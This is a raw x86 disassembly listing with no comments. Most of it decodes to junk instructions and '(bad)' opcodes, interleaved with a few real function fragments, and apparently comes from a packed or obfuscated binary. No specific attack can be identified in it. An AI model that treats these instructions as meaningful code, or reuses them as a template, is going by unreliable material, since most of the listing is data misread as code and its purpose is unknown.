  40b57d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b57e:	fistp  DWORD PTR ds:0x92871b90
  40b584:	xor    cl,ch
  40b586:	into   
  40b587:	stos   BYTE PTR es:[edi],al
  40b588:	or     ch,BYTE PTR [ecx-0x713baf95]
  40b58e:	ins    DWORD PTR es:[edi],dx
  40b58f:	scas   al,BYTE PTR es:[edi]
  40b590:	lods   eax,DWORD PTR ds:[esi]
  40b591:	sti    
  40b592:	in     al,dx
  40b593:	jl     0x40b5aa
  40b595:	clc    
  40b596:	imul   BYTE PTR [esi]
  40b598:	dec    ebp
  40b599:	or     bh,BYTE PTR [esi]
  40b59b:	adc    ch,BYTE PTR [ecx+ebp*4-0x48]
  40b59f:	out    dx,al
  40b5a0:	pop    edx
  40b5a1:	lds    eax,FWORD PTR [eax+eax*4]
  40b5a4:	fwait
  40b5a5:	mov    cl,0xbd
  40b5a7:	mov    ecx,0x89fff757
  40b5ac:	test   al,0xc1
  40b5ae:	mov    edi,0x9c221ab2
  40b5b3:	inc    esp
  40b5b4:	ins    DWORD PTR es:[edi],dx
  40b5b5:	sub    esp,DWORD PTR [edi-0x5a]
  40b5b8:	sbb    dl,BYTE PTR [ebp-0x31]
  40b5bb:	ror    BYTE PTR [ebx+0x17],cl
  40b5be:	or     cl,BYTE PTR [ebx-0x5f8c4fd9]
  40b5c4:	rcl    DWORD PTR [edx-0x65f553e7],cl
  40b5ca:	in     eax,0x4c
  40b5cc:	adc    al,0x5a
  40b5ce:	add    BYTE PTR [ecx+0x23],cl
  40b5d1:	push   0x156aba30
  40b5d6:	test   DWORD PTR [ebp-0xad7c377],ebp
  40b5dc:	jmp    0x6fd124b
  40b5e1:	or     al,0xaa
  40b5e3:	inc    esp
  40b5e4:	sar    BYTE PTR [ebp+0x9],cl
  40b5e7:	sub    dl,BYTE PTR [ebx+0x25b60c1]
  40b5ed:	sub    eax,0xf1832b8f
  40b5f2:	sbb    al,0x2d
  40b5f4:	in     al,dx
  40b5f5:	add    DWORD PTR [ecx+edx*1-0x2a45fad2],0xecc18c10
  40b600:	addr16 xchg edx,eax
  40b602:	cmc    
  40b603:	dec    edx
  40b604:	jne    0x40b5d2
  40b606:	inc    eax
  40b607:	inc    ebx
  40b608:	shl    BYTE PTR [edx+eax*2+0x3f],1
  40b60c:	in     al,dx
  40b60d:	(bad)  
  40b60e:	add    esi,ebp
  40b610:	inc    esi
  40b611:	in     eax,dx
  40b612:	scas   eax,DWORD PTR es:[edi]
  40b613:	(bad)  
  40b615:	and    DWORD PTR [ecx+0x71b1d293],ecx
  40b61b:	mov    cl,BYTE PTR [esi+0xf]
  40b61e:	je     0x40b5b1
  40b620:	fwait
  40b621:	sub    ah,BYTE PTR [edi-0x7]
  40b624:	inc    esp
  40b625:	dec    eax
  40b626:	and    al,BYTE PTR [edi-0x4a1e3656]
  40b62c:	imul   ebx,DWORD PTR [eax-0x18260abb],0xffffffeb
  40b633:	jnp    0x40b645
  40b635:	lahf   
  40b636:	pop    esi
  40b637:	retf   
  40b638:	leave  
  40b639:	stc    
  40b63a:	add    ah,al
  40b63c:	aam    0x93
  40b63e:	(bad)  
  40b63f:	out    0x6,al
  40b641:	loope  0x40b5c7
  40b643:	sbb    ebp,edx
  40b645:	jno    0x40b662
  40b647:	jne    0x40b663
  40b649:	in     eax,0x4
  40b64b:	pop    edx
  40b64c:	jae    0x40b6aa
  40b64e:	add    al,0xb6
  40b650:	repnz loope 0x40b5e0
  40b653:	xchg   ebp,eax
  40b654:	add    eax,0x4586cea
  40b659:	into   
  40b65a:	outs   dx,BYTE PTR ds:[esi]
  40b65b:	imul   ecx,DWORD PTR [ecx-0x2ff8a875],0xae9c8bbc
  40b665:	cmp    eax,0x989e2135
  40b66a:	sbb    BYTE PTR [ebx+ebp*8-0x347939fb],bl
  40b671:	div    DWORD PTR [ebx+ebx*1]
  40b674:	dec    ecx
  40b675:	nop
  40b676:	gs sub al,0xc6
  40b679:	cdq    
  40b67a:	in     eax,0xed
  40b67c:	pushf  
  40b67d:	xor    ah,BYTE PTR [esi+0x293b5fb8]
  40b683:	mov    WORD PTR [ebx+0x98b0c40],cs
  40b689:	jmp    0x40b841
  40b68e:	frndint 
  40b690:	std    
  40b691:	imul   ebx,DWORD PTR [ebp+0x69],0xffffffe9
  40b695:	mov    ch,BYTE PTR [edi+edx*8-0x20]
  40b699:	xor    edx,DWORD PTR [edx+0x2a27c434]
  40b69f:	repz jo 0x40b712
  40b6a2:	xchg   ebp,eax
  40b6a3:	jg     0x40b715
  40b6a5:	jo     0x40b69a
  40b6a7:	push   ss
  40b6a8:	mov    eax,0x8b4b9956
  40b6ad:	imul   esi,DWORD PTR [ecx],0xfa7e170a
  40b6b3:	(bad)  
  40b6b4:	out    dx,eax
  40b6b5:	loop   0x40b72c
  40b6b7:	icebp  
  40b6b8:	in     al,dx
  40b6b9:	adc    ah,bl
  40b6bb:	int3   
  40b6bc:	pop    ecx
  40b6bd:	jmp    0x40b73e
  40b6bf:	shl    BYTE PTR [eax-0x7fadb557],1
  40b6c5:	ja     0x40b65c
  40b6c7:	pushf  
  40b6c8:	lods   al,BYTE PTR ds:[esi]
  40b6c9:	cld    
  40b6ca:	jbe    0x40b683
  40b6cc:	ds or  eax,0x8c55d553
  40b6d2:	sub    eax,0x1ac6aa81
  40b6d7:	stc    
  40b6d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6d9:	(bad)  
  40b6da:	ficomp WORD PTR [edx+0x59]
  40b6dd:	jg     0x40b742
  40b6df:	mov    edx,0x88f7ab29
  40b6e4:	jb     0x40b74d
  40b6e6:	mov    bh,BYTE PTR [esi+0x5afdb9bb]
  40b6ec:	in     eax,dx
  40b6ed:	(bad)  
  40b6ee:	shr    DWORD PTR [ebp-0x539fa246],cl
  40b6f4:	jno    0x40b6b8
  40b6f6:	xchg   ebx,eax
  40b6f7:	mov    esi,0x863bd377
  40b6fc:	iret   
  40b6fd:	ret    0x9816
  40b700:	jne    0x40b68e
  40b702:	popf   
  40b703:	shr    DWORD PTR [ebx+esi*2-0x3a],1
  40b707:	iret   
  40b708:	outs   dx,BYTE PTR fs:[esi]
  40b70a:	mov    al,0x91
  40b70c:	xor    al,BYTE PTR [eax]
  40b70e:	adc    ebp,edx
  40b710:	mov    ebx,DWORD PTR [eax+0x62]
  40b713:	je     0x40b6e4
  40b715:	mov    esi,0x4adaa263
  40b71a:	xor    DWORD PTR [edx+ebp*4-0x48],ecx
  40b71e:	or     eax,0xb436c856
  40b723:	int    0x54
  40b725:	rcl    BYTE PTR [edi+0x536060f5],0xa4
  40b72c:	aad    0x84
  40b72e:	mov    ebp,DWORD PTR ds:[esi]
  40b731:	xor    ch,BYTE PTR [edi]
  40b733:	cmp    esi,DWORD PTR [ecx+ebp*4]
  40b736:	xlat   BYTE PTR ds:[ebx]
  40b737:	jle    0x40b7b7
  40b739:	xchg   edx,eax
  40b73a:	stc    
  40b73b:	test   eax,0x954319a4
  40b740:	outs   dx,DWORD PTR ds:[esi]
  40b741:	je     0x40b6f2
  40b743:	rol    BYTE PTR [ecx+0x1f],1
  40b746:	mov    DWORD PTR [eax+0xc],eax
  40b749:	mov    dh,0x79
  40b74b:	pop    ebp
  40b74c:	add    al,0x93
  40b74e:	push   eax
  40b74f:	xor    ecx,0xaa7f714f
  40b755:	push   esi
  40b756:	cli    
  40b757:	adc    BYTE PTR [ecx+0x43],ch
  40b75a:	mov    dl,0xdb
  40b75c:	icebp  
  40b75d:	icebp  
  40b75e:	stos   DWORD PTR es:[edi],eax
  40b75f:	shl    BYTE PTR [edi],cl
  40b761:	jno    0x40b7a4
  40b763:	sub    eax,0x2b53a84c
  40b768:	xlat   BYTE PTR ds:[ebx]
  40b769:	push   ss
  40b76a:	ins    BYTE PTR es:[edi],dx
  40b76b:	(bad)  
  40b76c:	xchg   ebx,eax
  40b76d:	add    dl,dl
  40b76f:	jmp    0x40b788
  40b771:	mov    al,ds:0x8710d45
  40b776:	test   eax,0xd938a0c4
  40b77b:	test   DWORD PTR [edx+0x63632e64],0x949804b0
  40b785:	jp     0x40b72f
  40b787:	jl     0x40b7c4
  40b789:	repnz shl BYTE PTR [ebx+0x28],cl
  40b78d:	push   0x1ad2aee0
  40b792:	cmc    
  40b793:	stc    
  40b794:	lahf   
  40b795:	sub    BYTE PTR [ecx-0x5],bl
  40b798:	rol    BYTE PTR [esi],cl
  40b79a:	fadd   QWORD PTR [ebp+0x1]
  40b79d:	call   0x1604:0xad67caa6
  40b7a4:	test   al,0x19
  40b7a6:	lods   eax,DWORD PTR ds:[esi]
  40b7a7:	push   cs
  40b7a8:	das    
  40b7a9:	(bad)  
  40b7aa:	dec    BYTE PTR [eax]
  40b7ac:	into   
  40b7ad:	or     BYTE PTR [ecx*1-0x38208bf7],al
  40b7b4:	and    DWORD PTR [edi+0x7a],esi
  40b7b7:	xchg   edi,eax
  40b7b8:	fisttp DWORD PTR [ecx+0x2]
  40b7bb:	ror    BYTE PTR [esi],1
  40b7bd:	test   DWORD PTR [edi+0x24],ebx
  40b7c0:	cwde   
  40b7c1:	push   ebx
  40b7c2:	(bad)  
  40b7c3:	sbb    edx,DWORD PTR [ebp-0x6c459632]
  40b7c9:	mov    edi,0x12e782d2
  40b7ce:	sahf   
  40b7cf:	out    0xcd,eax
  40b7d1:	rcr    BYTE PTR [esi],0x71
  40b7d4:	loop   0x40b7f7
  40b7d6:	inc    ebx
  40b7d7:	push   eax
  40b7d8:	out    dx,eax
  40b7d9:	cs sahf 
  40b7db:	loope  0x40b7c8
  40b7dd:	cmp    al,0x70
  40b7df:	lds    edx,FWORD PTR [eax+0x7be6474]
  40b7e5:	mov    edi,0x49999b5f
  40b7ea:	imul   ebx,DWORD PTR [edi],0x47
  40b7ed:	or     DWORD PTR [edx+0x57d40332],ebx
  40b7f3:	sub    ebx,0xffffffa2
  40b7f6:	pop    ds
  40b7f7:	mov    eax,0xce58c66e
  40b7fc:	arpl   WORD PTR [edi+0x6],di
  40b7ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b800:	mov    ebp,DWORD PTR [edx+0x3af3e287]
  40b806:	adc    ecx,esi
  40b808:	mov    ch,0x8b
  40b80a:	xor    DWORD PTR [ebp+esi*8-0x2ead947c],ebp
  40b811:	(bad)  
  40b812:	lea    esp,[edx]
  40b814:	pop    ebx
  40b815:	(bad)  
  40b816:	xor    edi,ecx
  40b818:	cmp    DWORD PTR [edi],esi
  40b81a:	inc    edx
  40b81b:	inc    esi
  40b81c:	mov    bl,0x86
  40b81e:	sbb    al,0x5a
  40b820:	pop    edi
  40b821:	in     eax,dx
  40b822:	jbe    0x40b866
  40b824:	push   esi
  40b825:	call   FWORD PTR [ebp+0xfb148be]
  40b82b:	test   eax,0x1d179a52
  40b830:	and    eax,0xc9e5fbe2
  40b835:	mov    dh,0xfd
  40b837:	mov    al,0x5a
  40b839:	mov    esp,0xb1f74021
  40b83e:	mov    al,0xbc
  40b840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b841:	mov    al,BYTE PTR [eax+ecx*1]
  40b844:	add    al,0x37
  40b846:	jmp    0x40b9fe
  40b84b:	hlt    
  40b84c:	sbb    eax,0x71518348
  40b851:	rep ins DWORD PTR es:[edi],dx
  40b853:	cmp    BYTE PTR [esp+ecx*2],al
  40b856:	aaa    
  40b857:	inc    esi
  40b858:	or     esi,DWORD PTR [ecx+edi*2]
  40b85b:	dec    edi
  40b85c:	bnd jo 0x40b8cf
  40b85f:	xchg   ebp,eax
  40b860:	jg     0x40b8d2
  40b862:	jo     0x40b7fb
  40b864:	jecxz  0x40b8a4
  40b866:	clc    
  40b867:	mov    esp,0x9e45be93
  40b86c:	mov    ch,0x2f
  40b86e:	jns    0x40b81f
  40b870:	pop    ebp
  40b871:	push   esi
  40b872:	test   DWORD PTR [ebp-0x43377b8e],edx
  40b878:	and    edx,DWORD PTR [ebp+0x76]
  40b87b:	xor    DWORD PTR [ecx+edx*1+0x402d6403],ecx
  40b882:	mov    DWORD PTR [ebp+edx*4-0x24446062],ecx
  40b889:	adc    esi,DWORD PTR [ebx-0x3451a3e8]
  40b88f:	daa    
  40b890:	into   
  40b891:	in     eax,0xa6
  40b893:	dec    ebx
  40b894:	sub    DWORD PTR [eax],0x4fd2474c
  40b89a:	jle    0x40b861
  40b89c:	std    
  40b89d:	bound  ebx,QWORD PTR [eax-0x68222c96]
  40b8a3:	pop    edi
  40b8a4:	das    
  40b8a5:	inc    ebx
  40b8a6:	adc    eax,0xc52785f2
  40b8ab:	(bad)  
  40b8ac:	push   esp
  40b8ad:	mov    ds:0xa2be42f8,al
  40b8b2:	rcl    edi,cl
  40b8b4:	push   edi
  40b8b5:	push   esp
  40b8b6:	rol    DWORD PTR [ebp+0x21a865f2],0xd2
  40b8bd:	push   esp
  40b8be:	fidiv  DWORD PTR [ebp+0x2d]
  40b8c1:	xchg   ecx,eax
  40b8c2:	mov    ds:0xfd5d2c94,al
  40b8c7:	ret    0x1bbf
  40b8ca:	outs   dx,BYTE PTR ds:[esi]
  40b8cb:	xor    BYTE PTR [ebx+0x2e],dl
  40b8ce:	(bad)  
  40b8d0:	pop    edx
  40b8d1:	pop    es
  40b8d2:	mov    ds:0x13c2d414,al
  40b8d7:	or     edi,DWORD PTR [edi]
  40b8d9:	push   es
  40b8da:	jp     0x40b8e2
  40b8dc:	pop    es
  40b8dd:	jne    0x40b872
  40b8df:	in     al,0xc
  40b8e1:	retf   0xb04b
  40b8e4:	out    0x52,eax
  40b8e6:	push   eax
  40b8e7:	add    dl,BYTE PTR [ecx]
  40b8e9:	sub    al,0x5f
  40b8eb:	cmp    edi,ecx
  40b8ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8ee:	daa    
  40b8ef:	xchg   esp,eax
  40b8f0:	pop    ebx
  40b8f1:	jae    0x40b927
  40b8f3:	xchg   DWORD PTR [edx+0x66],ebp
  40b8f6:	popf   
  40b8f7:	int3   
  40b8f8:	pushf  
  40b8f9:	jnp    0x40b8be
  40b8fb:	inc    ebx
  40b8fc:	out    dx,al
  40b8fd:	ror    WORD PTR [ebx+ebp*4+0xd],0x25
  40b903:	add    eax,0x77b89341
  40b908:	dec    ecx
  40b909:	cmp    ebp,ebx
  40b90b:	xchg   DWORD PTR [ebx+0x79ae9790],esp
  40b911:	sub    DWORD PTR [edi+0x73],ebx
  40b914:	mov    dl,0x6c
  40b916:	daa    
  40b917:	mov    edx,0x871d65df
  40b91c:	stc    
  40b91d:	pop    ecx
  40b91e:	aam    0xab
  40b920:	mov    cl,BYTE PTR [ecx-0x34912aa6]
  40b926:	and    al,0x95
  40b928:	jge    0x40b8db
  40b92a:	fs pop ebx
  40b92c:	(bad)  
  40b92d:	shr    DWORD PTR [esp+esi*1],cl
  40b930:	mov    ebp,0x9663b945
  40b935:	aaa    
  40b936:	sub    dl,BYTE PTR [eax-0x45226883]
  40b93c:	sub    BYTE PTR [eax-0x27],dl
  40b93f:	jecxz  0x40b98c
  40b941:	mov    esi,0xe065b7fa
  40b946:	and    eax,0x128adb9e
  40b94c:	and    al,0x90
  40b94f:	pop    ecx
  40b950:	jl     0x40b901
  40b952:	jmp    0x40b95b
  40b954:	rol    dl,1
  40b956:	cmp    ecx,DWORD PTR [esi+0x51]
  40b959:	rol    DWORD PTR [edx-0x76],0xce
  40b95d:	or     esp,DWORD PTR [eax]
  40b95f:	cmc    
  40b960:	cmp    BYTE PTR [edx+0x53],0xe5
  40b964:	mov    ecx,0x88d77cb0
  40b969:	sbb    ch,BYTE PTR [edi-0x38]
  40b96c:	retf   
  40b96d:	loop   0x40b96a
  40b96f:	add    bl,ah
  40b971:	out    0xce,al
  40b973:	push   eax
  40b974:	mov    al,ds:0x8692ac19
  40b979:	out    dx,eax
  40b97a:	scas   al,BYTE PTR es:[edi]
  40b97b:	shr    DWORD PTR [ebp-0x652795e3],cl
  40b981:	lahf   
  40b982:	out    0xf8,eax
  40b984:	fsub   DWORD PTR [edx]
  40b986:	ret    0xd9dc
  40b989:	test   BYTE PTR [edi+0x294fa56d],cl
  40b98f:	and    eax,0xa4968621
  40b994:	inc    edi
  40b995:	push   esi
  40b996:	aad    0xa7
  40b998:	pop    ebp
  40b999:	stos   DWORD PTR es:[edi],eax
  40b99a:	mov    ebp,0xc5f86d1f
  40b99f:	jno    0x40b9a8
  40b9a1:	mov    esp,edx
  40b9a3:	mov    ebp,DWORD PTR [ebx]
  40b9a5:	jbe    0x40b999
  40b9a7:	mov    esp,ds
  40b9a9:	addr16 (bad) 
  40b9ab:	xchg   ebp,eax
  40b9ac:	jmp    0x40b935
  40b9ae:	into   
  40b9af:	pop    eax
  40b9b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9b1:	cdq    
  40b9b2:	mov    BYTE PTR [ecx+0x317c9a32],dl
  40b9b8:	inc    edx
  40b9b9:	iret   
  40b9ba:	cmp    BYTE PTR [esi-0xd],bh
  40b9bd:	pop    ebp
  40b9be:	add    DWORD PTR ds:[esi],eax
  40b9c1:	arpl   WORD PTR [ecx-0x6ce2bc38],di
  40b9c7:	fwait
  40b9c8:	ror    DWORD PTR [esi],cl
  40b9ca:	xor    al,0xdb
  40b9cc:	(bad)  
  40b9cd:	xor    bl,al
  40b9cf:	ss addr16 sahf 
  40b9d2:	cli    
  40b9d3:	outs   dx,BYTE PTR ds:[esi]
  40b9d4:	ja     0x40b978
  40b9d6:	jl     0x40b9db
  40b9d8:	stos   BYTE PTR es:[edi],al
  40b9d9:	push   cs
  40b9da:	xchg   ebp,eax
  40b9db:	sbb    esp,edx
  40b9dd:	das    
  40b9de:	mov    ds:0x83bbb7ee,al
  40b9e3:	fiadd  WORD PTR [edi-0x15f368f0]
  40b9e9:	ret    
  40b9ea:	jae    0x40ba5f
  40b9ec:	idiv   DWORD PTR [edx+edi*8-0x6c]
  40b9f0:	inc    edi
  40b9f1:	push   ss
  40b9f2:	sbb    eax,0xc35a4f7b
  40b9f7:	loopne 0x40ba58
  40b9f9:	es cld 
  40b9fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9fc:	push   esp
  40b9fd:	mov    eax,ds:0xc53c4734
  40ba02:	je     0x40ba19
  40ba08:	mov    eax,DWORD PTR [ebp+0x8]
  40ba0b:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba0e:	xor    eax,esi
  40ba10:	add    eax,edi
  40ba12:	mov    DWORD PTR [ecx],eax
  40ba14:	jmp    0x40bbf5
  40ba19:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40ba20:	jmp    0x40bbf5
  40ba25:	mov    eax,DWORD PTR [ebp-0x8]
  40ba28:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ba2b:	mov    ecx,DWORD PTR [ecx]
  40ba2d:	mov    DWORD PTR [eax],ecx
  40ba2f:	mov    eax,DWORD PTR [ebp+0xc]
  40ba32:	jmp    0x40bbea
  40ba37:	retf   
  40ba38:	(bad)  [ebx+0x5171a9c1]
  40ba3e:	icebp  
  40ba3f:	dec    eax
  40ba40:	cmp    eax,0x64c00d6b
  40ba45:	dec    edi
  40ba46:	jle    0x40ba2c
  40ba48:	lock jo 0x40babb
  40ba4b:	xchg   ebp,eax
  40ba4c:	jg     0x40babe
  40ba4e:	jo     0x40babe
  40ba50:	dec    dl
  40ba52:	outs   dx,DWORD PTR ds:[esi]
  40ba53:	xchg   esi,eax
  40ba54:	js     0x40ba7d
  40ba56:	pop    ecx
  40ba57:	imul   eax,DWORD PTR [edx-0x4b],0xf9eee839
  40ba5e:	dec    edi
  40ba5f:	or     esi,DWORD PTR [ebx-0x10]
  40ba62:	pop    ecx
  40ba63:	fsubr  DWORD PTR [eax-0x1c522097]
  40ba69:	xor    al,0x54
  40ba6b:	int3   
  40ba6c:	xchg   edi,eax
  40ba6d:	xchg   ebp,eax
  40ba6e:	(bad)  [ebp-0x4cda813e]
  40ba74:	test   al,0x92
  40ba76:	add    DWORD PTR [ebx],edx
  40ba78:	test   BYTE PTR [ecx-0x29e9f8f5],al
  40ba7e:	add    ecx,edx
  40ba80:	movaps xmm5,XMMWORD PTR fs:[edi+ebx*2]
  40ba85:	push   esi
  40ba86:	mov    edx,0xbda593a8
  40ba8b:	pusha  
  40ba8c:	inc    edi
  40ba8d:	pop    ebx
  40ba8e:	mov    esp,edx
  40ba90:	aad    0x2c
  40ba92:	retf   
  40ba93:	rcr    BYTE PTR [ebx],cl
  40ba95:	xchg   esp,eax
  40ba96:	stos   BYTE PTR es:[edi],al
  40ba97:	pop    ss
  40ba98:	mov    dl,0xc1
  40ba9a:	pop    edx
  40ba9b:	jb     0x40ba5e
  40ba9d:	cs or  ch,cl
  40baa0:	add    ebx,DWORD PTR [ecx-0x6a9eb39a]
  40baa6:	dec    ecx
  40baa7:	jmp    0x59f459fa
  40baac:	test   eax,0x365658fd
  40bab1:	mov    al,ds:0xf0e25b7b
  40bab6:	lods   al,BYTE PTR ds:[esi]
  40bab7:	mov    al,ds:0xa8dbb026
  40babc:	xor    al,0x38
  40babe:	dec    esp
  40babf:	fnstenv [edi]
  40bac1:	aas    
  40bac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bac3:	bound  ecx,QWORD PTR [ebx]
  40bac5:	push   ds
  40bac6:	rcr    bh,cl
  40bac8:	add    al,0x95
  40baca:	xor    cl,BYTE PTR [esi+0xa31a019]
  40bad0:	cli    
  40bad1:	addr16 lahf 
  40bad3:	cwde   
  40bad4:	pop    edi
  40bad5:	mov    bh,0x27
  40bad7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bad8:	fidiv  WORD PTR [eax]
  40bada:	icebp  
  40badb:	push   ss
  40badc:	lock sbb BYTE PTR es:[ecx+0x57],bl
  40bae1:	xlat   BYTE PTR ds:[ebx]
  40bae2:	jo     0x40bb60
  40bae4:	aaa    
  40bae5:	cwde   
  40bae6:	dec    ecx
  40bae7:	loope  0x40bab7
  40bae9:	inc    ebx
  40baea:	js     0x40baca
  40baec:	xor    bl,BYTE PTR [esi-0x3f566da4]
  40baf2:	popa   
  40baf3:	mov    ds:0x62963d2,al
  40baf8:	and    edi,eax
  40bafa:	cmp    ebp,ebp
  40bafc:	sub    al,0x24
  40bafe:	jo     0x40ba88
  40bb00:	jmp    0xb562:0xb75a15f3
  40bb07:	cli    
  40bb08:	stos   BYTE PTR es:[edi],al
  40bb09:	pushf  
  40bb0a:	adc    esi,DWORD PTR [ebp+0x4c]
  40bb0d:	jl     0x40bb25
  40bb0f:	sbb    esp,DWORD PTR [ebx]
  40bb11:	and    BYTE PTR [edi-0x1e6a6752],bh
  40bb17:	and    DWORD PTR [edi+0x9],esi
  40bb1a:	add    DWORD PTR [esi+ebp*8-0x5ea754c],0xffffff9f
  40bb22:	inc    edx
  40bb23:	inc    ebx
  40bb24:	mov    eax,ds:0x923c55ce
  40bb29:	mov    edx,ebx
  40bb2b:	or     eax,0x57194094
  40bb30:	mov    esi,0x94708f06
  40bb35:	rcr    DWORD PTR [esi-0x7aca233a],1
  40bb3b:	aaa    
  40bb3c:	shl    DWORD PTR [ebx+0x7a9ffcf8],1
  40bb42:	sub    esp,DWORD PTR [ecx+0x70601acb]
  40bb48:	xor    DWORD PTR [esi+0x49a5892b],ebp
  40bb4e:	xchg   edi,eax
  40bb4f:	call   0x4c78:0xc0abf50c
  40bb56:	xchg   bh,bh
  40bb58:	sub    ebx,DWORD PTR [eax-0x6d]
  40bb5b:	xor    esi,ebp
  40bb5d:	pop    es
  40bb5e:	int3   
  40bb5f:	and    BYTE PTR [edx-0xec7d99d],ah
  40bb65:	inc    edi
  40bb66:	and    DWORD PTR [ecx],ebx
  40bb68:	sbb    edx,DWORD PTR [ebp-0x52]
  40bb6b:	inc    edi
  40bb6c:	or     eax,0xfc09808f
  40bb71:	push   ebp
  40bb72:	stos   BYTE PTR es:[edi],al
  40bb73:	xor    eax,0x2e3f1d80
  40bb78:	push   edx
  40bb79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb7a:	aad    0x4b
  40bb7c:	mov    dh,BYTE PTR [edx-0x2b712574]
  40bb82:	add    ah,cl
  40bb84:	mov    al,0xcc
  40bb86:	shr    ebp,0xfc
  40bb89:	fisttp WORD PTR ds:0x384a42f9
  40bb8f:	fs xchg cx,ax
  40bb92:	pop    esp
  40bb93:	mov    dl,0x23
  40bb95:	cmp    al,0xf5
  40bb97:	or     al,0x93
  40bb99:	xlat   BYTE PTR ds:[ebx]
  40bb9a:	and    bh,BYTE PTR ds:0xc848623e
  40bba0:	imul   BYTE PTR [ebx+0x54043243]
  40bba6:	inc    ebx
  40bba7:	scas   eax,DWORD PTR es:[edi]
  40bba8:	add    DWORD PTR [ebx-0x1a36d91e],esp
  40bbae:	xor    esi,DWORD PTR [esi+0xc]
  40bbb1:	es mul BYTE PTR ss:[esi-0x285c5842]
  40bbb9:	shl    esp,cl
  40bbbb:	dec    edx
  40bbbc:	das    
  40bbbd:	js     0x40bb94
  40bbbf:	jo     0x40bb9b
  40bbc1:	out    0xd,al
  40bbc3:	mov    al,0x6a
  40bbc5:	sbb    BYTE PTR [esi-0x56],dh
  40bbc8:	pop    ecx
  40bbc9:	mov    ebp,0x663fde8e
  40bbce:	push   edi
  40bbcf:	shr    eax,1
  40bbd1:	adc    al,0xf1
  40bbd3:	inc    ebp
  40bbd4:	iret   
  40bbd5:	mul    DWORD PTR [edi+esi*2-0x7a2df883]
  40bbdc:	sub    al,0xe6
  40bbde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbdf:	out    0x75,eax
  40bbe1:	and    DWORD PTR [ecx+esi*2],edx
  40bbe4:	mov    bh,bl
  40bbe6:	lods   eax,DWORD PTR ds:[esi]
  40bbe7:	rcr    DWORD PTR [eax+0x8458b7e],cl
  40bbed:	push   DWORD PTR [ebp-0x8]
  40bbf0:	call   0x401000
  40bbf5:	mov    eax,DWORD PTR [ebp-0xc]
  40bbf8:	cmp    eax,ebx
  40bbfa:	je     0x40acdc
  40bc00:	mov    eax,DWORD PTR [ebp-0x8]
  40bc03:	mov    eax,DWORD PTR [eax]
  40bc05:	pop    edi
  40bc06:	pop    esi
  40bc07:	pop    ebx
  40bc08:	leave  
  40bc09:	ret    0x8
  40bc0c:	push   ebp
  40bc0d:	mov    ebp,esp
  40bc0f:	push   ecx
  40bc10:	sbb    DWORD PTR ds:0x43439a,ecx
  40bc16:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40bc1d:	sbb    eax,DWORD PTR ds:0x434392
  40bc23:	mov    eax,DWORD PTR [ebp+0x8]
  40bc26:	or     DWORD PTR ds:0x434415,0x432dbe
  40bc30:	jmp    0x40be4b
  40bc35:	push   es
  40bc36:	mov    ch,dl
  40bc38:	xor    al,0x72
  40bc3a:	je     0x40bc02
  40bc3c:	stos   BYTE PTR es:[edi],al
  40bc3d:	aas    
  40bc3e:	lods   al,BYTE PTR ds:[esi]
  40bc3f:	and    DWORD PTR [eax-0x609914da],edi
  40bc45:	jns    0x40bc45
  40bc47:	jo     0x40bcb9
  40bc49:	jb     0x40bcca
  40bc4b:	jo     0x40bcbd
  40bc4d:	out    0x61,eax
  40bc4f:	scas   al,BYTE PTR es:[edi]
  40bc50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc51:	xor    bl,ah
  40bc53:	sbb    al,0x43
  40bc55:	(bad)  
  40bc56:	jnp    0x40bc97
  40bc58:	inc    ebp
  40bc59:	imul   esp,DWORD PTR [eax-0x57],0xffffff96
  40bc5d:	dec    edx
  40bc5e:	mov    ebp,0x17875b27
  40bc63:	push   cs
  40bc64:	(bad)  
  40bc65:	dec    ebp
  40bc66:	jl     0x40bcca
  40bc68:	popa   
  40bc69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc6a:	rcl    BYTE PTR [ebx+ebx*8],1
  40bc6d:	in     al,dx
  40bc6e:	xchg   esi,eax
  40bc6f:	adc    ah,BYTE PTR [edi+eiz*1]
  40bc72:	scas   eax,DWORD PTR es:[edi]
  40bc73:	retf   
  40bc74:	sbb    al,0x58
  40bc76:	mov    ds:0x19999e70,al
  40bc7b:	inc    esp
  40bc7c:	neg    DWORD PTR [edi]
  40bc7e:	cmp    BYTE PTR [ecx],ch
  40bc80:	neg    BYTE PTR [edi-0x6b]
  40bc83:	rcr    al,0xf1
  40bc86:	leave  
  40bc87:	test   BYTE PTR [ecx+edx*2],al
  40bc8a:	push   cs
  40bc8b:	mov    ecx,0x5a2da31e
  40bc90:	push   es
  40bc91:	lods   al,BYTE PTR ds:[esi]
  40bc92:	inc    esi
  40bc93:	jns    0x40bcad
  40bc95:	sub    dh,0x6f
  40bc98:	arpl   cx,cx
  40bc9a:	xor    ch,BYTE PTR [eax+0x50]
  40bc9d:	mov    dl,0x39
  40bc9f:	xchg   edi,eax
  40bca0:	lods   al,BYTE PTR ds:[esi]
  40bca1:	and    al,0xdd
  40bca3:	xchg   ebp,ecx
  40bca5:	add    edi,ecx
  40bca7:	push   esi
  40bca8:	mov    ebp,0xa85800d
  40bcad:	fidivr DWORD PTR [esi+0x1779ae9]
  40bcb3:	jnp    0x40bc55
  40bcb5:	xchg   edi,eax
  40bcb6:	mov    esp,0x9063dd05
  40bcbb:	sub    dh,BYTE PTR [ecx+eiz*2+0x63]
  40bcbf:	aam    0xa4
  40bcc1:	and    bl,dh
  40bcc3:	pop    ebp
  40bcc4:	mov    al,ss:0x83031c6e
  40bcca:	sbb    ah,dl
  40bccc:	cmp    al,0xd4
  40bcce:	jle    0x40bc65
  40bcd0:	sub    eax,0x23104184
